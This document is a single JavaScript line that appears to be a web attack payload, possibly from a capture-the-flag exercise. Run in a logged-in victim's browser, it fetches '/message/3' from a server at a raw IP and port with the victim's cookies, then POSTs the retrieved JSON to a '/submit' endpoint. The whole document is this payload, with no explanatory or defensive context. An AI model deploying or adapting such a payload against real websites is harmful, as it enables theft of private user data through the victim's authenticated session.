fetch('http://94.237.55.163:44028/message/3').then(r => r.json()).then(t => fetch('http://94.237.55.163:44028/submit', {method: 'POST', mode: 'cors', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(t)}))
